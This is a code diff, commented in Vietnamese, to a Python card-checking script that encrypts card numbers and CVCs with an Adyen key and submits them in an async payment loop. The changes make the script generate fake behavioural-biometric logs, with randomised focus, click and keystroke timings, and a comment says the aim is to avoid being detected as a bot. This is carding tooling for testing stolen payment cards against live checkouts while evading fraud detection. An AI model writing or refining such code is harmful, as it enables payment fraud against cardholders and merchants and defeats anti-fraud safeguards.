@@ -205,30 +205,36 @@ def format_card_number(card):
 
 def generate_fake_adyen_log(input_length):
     """
-    Tạo chuỗi log giả lập hành vi người dùng (fo, cl, KN, ch, bl...)
-    với timestamp tăng dần ngẫu nhiên.
+    CẢI TIẾN: Tạo chuỗi log Behavior Biometrics giả lập hành vi người dùng thật.
+    Tránh dùng log tĩnh để không bị phát hiện là Bot.
     """
-    base_time = random.randint(3000, 10000) # Thời gian bắt đầu ngẫu nhiên từ lúc load trang
+    # Random thời gian bắt đầu load trang (từ 5s đến 15s trước khi nhập)
+    base_time = random.randint(5000, 15000) 
     log_parts = []
     
-    # 1. Focus (fo)
-    base_time += random.randint(100, 500)
+    # 1. Focus (fo) - Người dùng nhấp vào ô input
+    base_time += random.randint(200, 800)
     log_parts.append(f"fo@{base_time}")
     
-    # 2. Click (cl)
-    base_time += random.randint(50, 200)
+    # 2. Click (cl) - Sự kiện click xảy ra ngay sau focus
+    base_time += random.randint(10, 100)
     log_parts.append(f"cl@{base_time}")
     
-    # 3. KeyDown (KN) - Mô phỏng gõ từng ký tự
+    # 3. KeyDown (KN) - Mô phỏng gõ từng ký tự với tốc độ biến thiên
     for _ in range(input_length):
-        base_time += random.randint(80, 250) # Tốc độ gõ phím người thật
+        # Tốc độ gõ trung bình của người: 80ms - 250ms giữa các phím
+        # Có thể thêm delay ngẫu nhiên lớn hơn để mô phỏng sự khựng lại
+        delay = random.randint(80, 250)
+        if random.random() < 0.1: # 10% cơ hội ngừng lại suy nghĩ
+             delay += random.randint(200, 500)
+             
+        base_time += delay
         log_parts.append(f"KN@{base_time}")
         
-    # 4. Change (ch) & Blur (bl)
-    base_time += random.randint(50, 150)
-    
-    base_time += random.randint(100, 300)
-    log_parts.append(f"bl@{base_time}") # Blur ra ngoài
+    # 4. Blur (bl) - Người dùng bấm ra ngoài hoặc chuyển tab (Tab key)
+    # Thường có 1 khoảng ngưng sau khi gõ xong
+    base_time += random.randint(300, 1000)
+    log_parts.append(f"bl@{base_time}") 
     
     return ",".join(log_parts)
 
@@ -240,8 +246,10 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
     
     card_number_fmt = format_card_number(card)
     
-    # --- TẠO LOG BEHAVIOR ĐỘNG ---
-    card_log = generate_fake_adyen_log(16)
+    # --- TẠO LOG BEHAVIOR ĐỘNG (IMPROVED) ---
+    # Log cho trường thẻ (16-19 số)
+    card_log = generate_fake_adyen_log(len(card))
+    # Log cho CVC (3-4 số)
     cvc_log = generate_fake_adyen_log(len(str(cvc)))
     
     card_detail = {
@@ -252,7 +260,7 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
             "activate": "3", 
             "referrer": referrer, 
             "numberFieldFocusCount": "1", 
-            "numberFieldLog": card_log, 
+            "numberFieldLog": card_log, # Dynamic Log
             "numberFieldClickCount": "1", 
             "numberFieldKeyCount": str(len(card)),
             "numberFieldBlurCount": "1"
@@ -272,7 +280,7 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
             "activate": "4", 
             "referrer": referrer, 
             "cvcFieldFocusCount": "1", 
-            "cvcFieldLog": cvc_log, 
+            "cvcFieldLog": cvc_log, # Dynamic Log
             "cvcFieldClickCount": "1", 
             "cvcFieldKeyCount": str(len(str(cvc))), 
             "cvcFieldChangeCount": "1", 
@@ -458,7 +466,6 @@ async def check_card_core(line, session_semaphore=None):
     offer_id = current_config["id"]
 
     # --- [IMPROVED TIME CHECK] ---
-    # Không khởi tạo start_time ở đây nữa để tránh tính thời gian chờ queue
     
     line = line.strip()
     result = {
@@ -528,7 +535,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                     retry_count += 1
                     continue
 
-                # --- BƯỚC 3: MÃ HÓA ---
+                # --- BƯỚC 3: MÃ HÓA (Đã cập nhật logic fake log động) ---
                 encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
 
                 # --- BƯỚC 4: THANH TOÁN ---
